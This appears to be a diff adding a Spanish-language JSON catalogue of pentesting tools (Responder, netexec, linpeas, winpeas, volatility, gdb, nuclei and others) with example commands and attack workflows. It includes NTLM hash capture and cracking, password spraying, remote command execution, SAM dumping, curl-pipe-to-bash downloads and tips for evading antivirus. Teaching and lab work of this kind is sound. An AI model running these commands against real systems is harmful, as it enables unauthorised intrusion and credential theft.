+        "nbns",
+        "hash",
+        "windows",
+        "red local",
+        "envenenamiento"
+      ],
+      "description": "Intercepta autenticaciones NTLM envenenando LLMNR/NBT-NS. Captura hashes NTLMv2 que puedes crackear después con hashcat.",
+      "when_to_use": "En redes internas Windows donde LLMNR está activo. Solo funciona en la misma LAN.",
+      "output_guide": "Hashes NTLMv2 se guardan en /usr/share/responder/logs/. Crackea con hashcat -m 5600.",
+      "chain": [
+        "hashcat",
+        "netexec"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Modo activo (captura hashes)",
+          "cmd": "sudo responder -I eth0 -wF",
+          "level": 2
+        },
+        {
+          "desc": "Modo análisis — solo escucha",
+          "cmd": "sudo responder -I eth0 -A",
+          "level": 2
+        },
+        {
+          "desc": "Crackear NTLMv2 capturados",
+          "cmd": "hashcat -m 5600 /usr/share/responder/logs/NTLMv2-SSP-{target}.txt /usr/share/wordlists/rockyou.txt",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "No captura nada: verifica estar en la misma LAN que los hosts Windows.",
+        "Conflicto de puertos: para los servidores HTTP/HTTPS si ya tienes algo en esos puertos."
+      ]
+    },
+    {
+      "name": "netexec",
+      "category": "Network",
+      "level": 2,
+      "tags": [
+        "smb",
+        "windows",
+        "lateral",
+        "credenciales",
+        "active directory",
+        "spray"
+      ],
+      "description": "Sucesor de CrackMapExec. Valida credenciales y automatiza movimiento lateral en redes Windows vía SMB, WinRM, SSH, LDAP.",
+      "when_to_use": "Cuando tienes credenciales y quieres saber a qué sistemas dan acceso. También para password spraying controlado.",
+      "output_guide": "[+] = válida sin privilegios. [+] Pwn3d! = administrador local.",
+      "chain": [
+        "responder",
+        "enum4linux",
+        "metasploit"
+      ],
+      "installed": false,
+      "install_cmd": "sudo apt install netexec",
+      "examples": [
+        {
+          "desc": "Verificar credenciales contra SMB",
+          "cmd": "netexec smb {target} -u admin -p {hash}",
+          "level": 2
+        },
+        {
+          "desc": "Password spray en rango de red",
+          "cmd": "netexec smb 192.168.1.0/24 -u usuarios.txt -p 'Password123!' --continue-on-success",
+          "level": 2
+        },
+        {
+          "desc": "Enumerar usuarios del dominio",
+          "cmd": "netexec smb {target} -u admin -p {hash} --users",
+          "level": 2
+        },
+        {
+          "desc": "Ejecutar comando remoto",
+          "cmd": "netexec smb {target} -u admin -p {hash} -x 'whoami'",
+          "level": 3
+        },
+        {
+          "desc": "Dump hashes SAM",
+          "cmd": "netexec smb {target} -u admin -p {hash} --sam",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "No instalado: sudo apt install netexec. En Kali antiguo puede ser crackmapexec (cme).",
+        "ACCESS_DENIED: credenciales válidas pero sin privilegios de admin."
+      ]
+    },
+    {
+      "name": "linpeas",
+      "category": "Post-Exploitation",
+      "level": 2,
+      "tags": [
+        "escalada",
+        "linux",
+        "privilegios",
+        "suid",
+        "cron",
+        "enumeracion",
+        "local"
+      ],
+      "description": "Enumeración automática para escalada de privilegios en Linux. Revisa SUID, cron jobs, capabilities, credenciales en archivos y más.",
+      "when_to_use": "Inmediatamente después de conseguir acceso como usuario no privilegiado. El objetivo es escalar a root.",
+      "output_guide": "ROJO = vectores de alta probabilidad. AMARILLO = interesante con condiciones. Lee especialmente: SUID, sudo -l, cron, capabilities.",
+      "chain": [
+        "metasploit",
+        "netcat"
+      ],
+      "installed": false,
+      "install_cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh",
+      "examples": [
+        {
+          "desc": "Descargar y ejecutar directamente",
+          "cmd": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash",
+          "level": 1
+        },
+        {
+          "desc": "Transferir con netcat desde tu máquina",
+          "cmd": "nc -lvnp 8888 < linpeas.sh",
+          "level": 2
+        },
+        {
+          "desc": "Ejecutar y guardar output",
+          "cmd": "bash linpeas.sh | tee /tmp/linpeas_output.txt",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Sin internet en el target: descarga en tu máquina y transfiere con netcat o python http.server.",
+        "AV bloqueando: renombra el script o modifica las primeras líneas."
+      ]
+    },
+    {
+      "name": "winpeas",
+      "category": "Post-Exploitation",
+      "level": 2,
+      "tags": [
+        "escalada",
+        "windows",
+        "privilegios",
+        "enumeracion",
+        "local",
+        "servicios"
+      ],
+      "description": "Equivalente de linpeas para Windows. Enumera vectores de escalada: servicios vulnerables, tareas programadas, credenciales guardadas.",
+      "when_to_use": "Después de acceder a Windows como usuario sin privilegios. El objetivo es llegar a SYSTEM o Administrador.",
+      "output_guide": "Rojo = crítico. Busca: AlwaysInstallElevated, SeImpersonatePrivilege, rutas sin comillas, credenciales guardadas.",
+      "chain": [
+        "metasploit"
+      ],
+      "installed": false,
+      "install_cmd": "wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
+      "examples": [
+        {
+          "desc": "Ejecutar en Windows",
+          "cmd": "winPEASx64.exe",
+          "level": 1
+        },
+        {
+          "desc": "Solo contraseñas guardadas",
+          "cmd": "winPEASx64.exe windowscreds",
+          "level": 2
+        },
+        {
+          "desc": "Guardar output",
+          "cmd": "winPEASx64.exe > C:\\Windows\\Temp\\output.txt",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Bloqueado por Defender: usa winPEAS.bat como alternativa.",
+        "Para transferir: python3 -m http.server 80 en Kali, luego certutil -urlcache -split -f http://{ip}/winPEASx64.exe en Windows."
+      ]
+    },
+    {
+      "name": "volatility",
+      "category": "Forensics",
+      "level": 3,
+      "tags": [
+        "memoria",
+        "ram",
+        "forense",
+        "malware",
+        "analisis",
+        "dump"
+      ],
+      "description": "Análisis forense de volcados de memoria RAM. Extrae procesos, conexiones, credenciales y artefactos de malware.",
+      "when_to_use": "En análisis forense o CTF cuando tienes un archivo .raw, .dmp, .vmem. No se usa en pentesting activo.",
+      "output_guide": "Primero identifica el perfil (windows.info). Luego usa plugins: pslist, netscan, hashdump.",
+      "chain": [
+        "john",
+        "hashcat"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Identificar el SO del volcado",
+          "cmd": "volatility3 -f {hash} windows.info",
+          "level": 2
+        },
+        {
+          "desc": "Listar procesos",
+          "cmd": "volatility3 -f {hash} windows.pslist",
+          "level": 2
+        },
+        {
+          "desc": "Ver conexiones de red",
+          "cmd": "volatility3 -f {hash} windows.netscan",
+          "level": 2
+        },
+        {
+          "desc": "Extraer hashes de contraseñas",
+          "cmd": "volatility3 -f {hash} windows.hashdump",
+          "level": 3
+        },
+        {
+          "desc": "Detectar procesos ocultos (rootkits)",
+          "cmd": "volatility3 -f {hash} windows.psscan",
+          "level": 3
+        }
+      ],
+      "troubleshooting": [
+        "volatility vs volatility3: Kali moderno usa vol3. La sintaxis es diferente.",
+        "Perfil no detectado: vol3 lo detecta automáticamente, no necesitas especificarlo."
+      ]
+    },
+    {
+      "name": "binwalk",
+      "category": "Forensics",
+      "level": 2,
+      "tags": [
+        "binario",
+        "firmware",
+        "esteganografia",
+        "extraccion",
+        "ctf",
+        "embedded"
+      ],
+      "description": "Analiza y extrae datos embebidos en binarios o firmware. Muy común en CTF para encontrar archivos dentro de otros.",
+      "when_to_use": "En CTF de forense cuando tienes un binario, imagen de firmware o archivo sospechoso.",
+      "output_guide": "Muestra qué tipos de datos encontró y en qué offset. Con -e extrae todo en un directorio _nombre_extracted.",
+      "chain": [
+        "steghide"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Analizar qué hay dentro de un archivo",
+          "cmd": "binwalk {hash}",
+          "level": 1
+        },
+        {
+          "desc": "Extraer todo el contenido",
+          "cmd": "binwalk -e {hash}",
+          "level": 1
+        },
+        {
+          "desc": "Extracción recursiva y profunda",
+          "cmd": "binwalk -Me {hash}",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Archivos corruptos al extraer: es normal, algunos datos están fragmentados.",
+        "No encuentra nada: puede estar cifrado. Prueba 'file' y 'strings' primero."
+      ]
+    },
+    {
+      "name": "steghide",
+      "category": "Forensics",
+      "level": 2,
+      "tags": [
+        "esteganografia",
+        "imagen",
+        "audio",
+        "ctf",
+        "oculto",
+        "jpeg"
+      ],
+      "description": "Oculta o extrae datos de imágenes JPEG/BMP y audio WAV/AU. La herramienta de esteganografía más usada en CTF.",
+      "when_to_use": "En CTF cuando te dan una imagen. Prueba primero sin contraseña (Enter vacío), luego contraseñas comunes.",
+      "output_guide": "Si extrae exitosamente, el archivo aparece en el directorio actual. Revisa con 'file'.",
+      "chain": [
+        "binwalk"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Extraer datos ocultos",
+          "cmd": "steghide extract -sf imagen.jpg",
+          "level": 1
+        },
+        {
+          "desc": "Ver info sin extraer",
+          "cmd": "steghide info imagen.jpg",
+          "level": 1
+        },
+        {
+          "desc": "Ocultar archivo en imagen",
+          "cmd": "steghide embed -cf imagen.jpg -ef secreto.txt -p {hash}",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Passphrase incorrecta: prueba la contraseña del CTF, nombres del challenge, o usa stegcracker.",
+        "Formato no soportado: steghide solo soporta JPEG, BMP, WAV, AU. Para PNG usa zsteg."
+      ]
+    },
+    {
+      "name": "gdb",
+      "category": "Reversing",
+      "level": 3,
+      "tags": [
+        "debug",
+        "binario",
+        "buffer overflow",
+        "exploit",
+        "asm",
+        "memoria",
+        "registros"
+      ],
+      "description": "Debugger GNU. Ejecuta binarios paso a paso, inspecciona registros y memoria. Base para exploits de buffer overflow.",
+      "when_to_use": "Para entender cómo funciona un binario, encontrar vulnerabilidades de memoria o desarrollar exploits.",
+      "output_guide": "Los registros (esp, eip, rip) indican dónde está la ejecución. EIP en 0x41414141 (AAAA) confirma buffer overflow.",
+      "chain": [
+        "searchsploit",
+        "metasploit"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Abrir binario",
+          "cmd": "gdb -q ./{hash}",
+          "level": 2
+        },
+        {
+          "desc": "Breakpoint en main y correr",
+          "cmd": "break main; run",
+          "level": 2
+        },
+        {
+          "desc": "Ver registros",
+          "cmd": "info registers",
+          "level": 2
+        },
+        {
+          "desc": "Examinar stack",
+          "cmd": "x/20xw $esp",
+          "level": 3
+        },
+        {
+          "desc": "Instalar GEF (mejora mucho gdb)",
+          "cmd": "bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\"",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Instala GEF o pwndbg: gdb base es difícil de leer.",
+        "Binario con protecciones: verifica con 'checksec ./{hash}' qué tiene (PIE, ASLR, NX, Canary)."
+      ]
+    },
+    {
+      "name": "strings",
+      "category": "Reversing",
+      "level": 1,
+      "tags": [
+        "binario",
+        "texto",
+        "analisis",
+        "rapido",
+        "ctf",
+        "contrasena"
+      ],
+      "description": "Extrae cadenas de texto de archivos binarios. Paso 0 en cualquier análisis — frecuentemente revela contraseñas hardcodeadas, URLs y pistas.",
+      "when_to_use": "Antes de cualquier análisis complejo. En menos de un segundo te da el panorama general del binario.",
+      "output_guide": "Busca cadenas que parezcan contraseñas, flags (CTF{...}), URLs, nombres de archivo. Filtra con grep.",
+      "chain": [
+        "gdb",
+        "binwalk"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Extraer strings de un binario",
+          "cmd": "strings {hash}",
+          "level": 1
+        },
+        {
+          "desc": "Filtrar posibles contraseñas",
+          "cmd": "strings {hash} | grep -iE 'pass|key|secret|flag|token|admin'",
+          "level": 1
+        },
+        {
+          "desc": "Strings con longitud mínima 8 (menos ruido)",
+          "cmd": "strings -n 8 {hash}",
+          "level": 1
+        },
+        {
+          "desc": "Con offset — saber dónde está en el binario",
+          "cmd": "strings -t x {hash}",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Demasiado output: siempre usa pipe con grep.",
+        "No encuentra nada útil: el binario puede estar empaquetado. Prueba binwalk primero."
+      ]
+    },
+    {
+      "name": "nuclei",
+      "category": "Web",
+      "level": 2,
+      "tags": [
+        "vulnerabilidades",
+        "templates",
+        "cve",
+        "automatico",
+        "web",
+        "scanner"
+      ],
+      "description": "Scanner de vulnerabilidades basado en templates YAML. Miles de templates para CVEs, misconfigurations y exposures. Más preciso que nikto.",
+      "when_to_use": "Después de identificar el stack tecnológico. Más potente que nikto para encontrar CVEs concretos.",
+      "output_guide": "Cada hallazgo incluye el template con CVE y severidad. Críticos/altos se explotan primero.",
+      "chain": [
+        "gobuster",
+        "searchsploit",
+        "metasploit"
+      ],
+      "installed": false,
+      "install_cmd": "sudo apt install nuclei && nuclei -update-templates",
+      "examples": [
+        {
+          "desc": "Scan básico",
+          "cmd": "nuclei -u http://{target}",
+          "level": 1
+        },
+        {
+          "desc": "Solo críticas y altas",
+          "cmd": "nuclei -u http://{target} -s critical,high",
+          "level": 1
+        },
+        {
+          "desc": "Solo CVEs",
+          "cmd": "nuclei -u http://{target} -tags cve",
+          "level": 2
+        },
+        {
+          "desc": "Solo misconfigurations",
+          "cmd": "nuclei -u http://{target} -tags misconfig",
+          "level": 2
+        },
+        {
+          "desc": "Actualizar templates",
+          "cmd": "nuclei -update-templates",
+          "level": 1
+        }
+      ],
+      "troubleshooting": [
+        "No instalado: sudo apt install nuclei && nuclei -update-templates",
+        "Muchos falsos positivos: especifica tags concretos."
+      ]
+    },
+    {
+      "name": "feroxbuster",
+      "category": "Web",
+      "level": 2,
+      "tags": [
+        "directorios",
+        "web",
+        "rapido",
+        "recursivo",
+        "fuzzing",
+        "rust"
+      ],
+      "description": "Scanner de directorios web en Rust, extremadamente rápido. Hace recursión automática: si encuentra /admin/ escanea /admin/* también.",
+      "when_to_use": "Cuando quieres un scan más profundo y rápido que gobuster. La recursión automática lo hace ideal para aplicaciones con muchos niveles.",
+      "output_guide": "El color indica el status code. La recursión puede generar mucho output — filtra con --filter-status.",
+      "chain": [
+        "gobuster",
+        "burpsuite",
+        "ffuf"
+      ],
+      "installed": false,
+      "install_cmd": "sudo apt install feroxbuster",
+      "examples": [
+        {
+          "desc": "Scan recursivo básico",
+          "cmd": "feroxbuster -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
+          "level": 1
+        },
+        {
+          "desc": "Con extensiones y recursión",
+          "cmd": "feroxbuster -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html",
+          "level": 2
+        },
+        {
+          "desc": "Filtrando ruido",
+          "cmd": "feroxbuster -u http://{target} -w /usr/share/wordlists/dirb/common.txt --filter-status 404 --filter-size 0",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Demasiado ruido por recursión: limita profundidad con -d 2.",
+        "No instalado: sudo apt install feroxbuster"
+      ]
+    },
+    {
+      "name": "strace",
+      "category": "Reversing",
+      "level": 2,
+      "tags": [
+        "syscalls",
+        "debug",
+        "proceso",
+        "archivos",
+        "binario",
+        "analisis"
+      ],
+      "description": "Rastrea las syscalls de un proceso. Revela qué archivos abre, qué red usa y cómo se comporta un binario sin ver su código.",
+      "when_to_use": "Para entender qué hace un binario desconocido sin desensamblarlo. Más rápido que GDB para visión general.",
+      "output_guide": "Cada línea es una syscall. Busca: open/openat (archivos), connect (red), execve (procesos que lanza).",
+      "chain": [
+        "gdb",
+        "strings"
+      ],
+      "installed": true,
+      "examples": [
+        {
+          "desc": "Trazar todas las syscalls",
+          "cmd": "strace ./{hash}",
+          "level": 2
+        },
+        {
+          "desc": "Solo syscalls de archivos",
+          "cmd": "strace -e trace=file ./{hash}",
+          "level": 2
+        },
+        {
+          "desc": "Solo syscalls de red",
+          "cmd": "strace -e trace=network ./{hash}",
+          "level": 2
+        },
+        {
+          "desc": "Guardar output",
+          "cmd": "strace -o strace_output.txt ./{hash}",
+          "level": 2
+        }
+      ],
+      "troubleshooting": [
+        "Permiso denegado al trazar proceso en ejecución: usa sudo.",
+        "Output ilegible: filtra con -e trace= para ver solo las syscalls relevantes."
+      ]
+    }
+  ],
+  "pentest_flows": [
+    {
+      "id": "external_recon",
+      "title": "Reconocimiento Externo",
+      "level": 1,
+      "description": "Recolectar información sobre el objetivo sin interactuar directamente. Todo desde fuentes públicas.",
+      "steps": [
+        {
+          "tool": "whois",
+          "action": "Obtener info del dominio/IP desde registros públicos"
+        },
+        {
+          "tool": "theHarvester",
+          "action": "Recolectar emails y subdominios desde Google, Bing, crt.sh"
+        },
+        {
+          "tool": "nmap",
+          "action": "Scan de puertos sobre los hosts descubiertos"
+        }
+      ]
+    },
+    {
+      "id": "web_pentest",
+      "title": "Pentest Web Básico",
+      "level": 1,
+      "description": "Flujo estándar para auditar una aplicación web desde cero hasta explotación.",
+      "steps": [
+        {
+          "tool": "nmap",
+          "action": "Identificar el servidor web y su versión"
+        },
+        {
+          "tool": "gobuster",
+          "action": "Enumerar directorios y archivos ocultos"
+        },
+        {
+          "tool": "nikto",
+          "action": "Scan automático de vulnerabilidades conocidas"
+        },
+        {
+          "tool": "burpsuite",
+          "action": "Interceptar y analizar el tráfico de la aplicación"
+        },
+        {
+          "tool": "sqlmap",
+          "action": "Probar parámetros para SQL injection"
+        }
+      ]
+    },
+    {
+      "id": "network_internal",
+      "title": "Red Interna Windows",
+      "level": 2,
+      "description": "Enumeración y explotación de una red interna con sistemas Windows.",
+      "steps": [
+        {
+          "tool": "netdiscover",
+          "action": "Descubrir hosts activos en la LAN"
+        },
+        {
+          "tool": "nmap",
+          "action": "Scan completo de puertos en hosts descubiertos"
+        },
+        {
+          "tool": "enum4linux",
+          "action": "Enumerar usuarios y shares en sistemas Windows/Samba"
+        },
+        {
+          "tool": "responder",
+          "action": "Capturar hashes NTLMv2 de la red"
+        },
+        {
+          "tool": "hashcat",
+          "action": "Crackear los hashes NTLMv2 capturados"
+        },
+        {
+          "tool": "netexec",
+          "action": "Validar credenciales y moverse lateralmente"
+        }
+      ]
+    },
+    {
+      "id": "post_exploit_linux",
+      "title": "Post-Explotación Linux",
+      "level": 2,
+      "description": "Qué hacer después de conseguir acceso a un Linux como usuario sin privilegios.",
+      "steps": [
+        {
+          "tool": "linpeas",
+          "action": "Enumerar vectores de escalada de privilegios"
+        },
+        {
+          "tool": "netcat",
+          "action": "Estabilizar la shell y mejorar interactividad"
+        },
+        {
+          "tool": "john",
+          "action": "Crackear hashes de /etc/shadow si tienes acceso"
+        }
+      ]
+    },
+    {
+      "id": "ctf_forensics",
+      "title": "CTF Forense",
+      "level": 2,
+      "description": "Flujo para resolver desafíos de forense digital en CTF.",
+      "steps": [
+        {
+          "tool": "strings",
+          "action": "Analizar archivos en busca de texto legible y flags"
+        },
+        {
+          "tool": "binwalk",
+          "action": "Detectar y extraer archivos embebidos"
+        },
+        {
+          "tool": "steghide",
+          "action": "Extraer datos ocultos en imágenes/audio"
+        },
+        {
+          "tool": "volatility",
+          "action": "Analizar volcados de memoria RAM"
+        }
+      ]
+    },
+    {
+      "id": "vuln_research",
+      "title": "Investigación de Vulnerabilidades",
+      "level": 3,
+      "description": "Identificar y explotar vulnerabilidades conocidas en un servicio.",
+      "steps": [
+        {
+          "tool": "nmap",
+          "action": "Identificar versión exacta del servicio vulnerable"
+        },
+        {
+          "tool": "searchsploit",
+          "action": "Buscar exploits públicos para esa versión"
+        },
+        {
+          "tool": "metasploit",
+          "action": "Ejecutar el exploit y obtener sesión"
+        },
+        {
+          "tool": "linpeas",
+          "action": "Escalar privilegios en el sistema comprometido"
+        }
+      ]
+    }
+  ]
+}
